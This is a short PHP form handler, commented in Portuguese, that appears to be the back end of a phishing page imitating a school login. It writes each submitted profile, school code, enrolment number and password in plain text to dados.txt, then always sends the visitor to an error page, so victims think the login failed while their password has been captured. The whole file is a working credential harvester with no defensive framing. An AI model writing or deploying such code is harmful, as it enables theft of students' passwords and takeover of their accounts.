<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $perfil = $_POST['perfil'] ?? '';
    $codetec = $_POST['codetec'] ?? '';
    $rm = $_POST['rm'] ?? '';
    $senha = $_POST['senha'] ?? '';

    // Tenta salvar em um arquivo
    $linha = "$perfil;$codetec;$rm;$senha\n";
    $salvo = file_put_contents("dados.txt", $linha, FILE_APPEND);

    if ($salvo !== false) {
        // Redireciona para erro.html (ou poderia ser uma "página de sucesso" se desejar)
        header("Location: erro.html");
        exit;
    } else {
        // Se não conseguiu salvar, também redireciona
        header("Location: erro.html");
        exit;
    }
}
?>
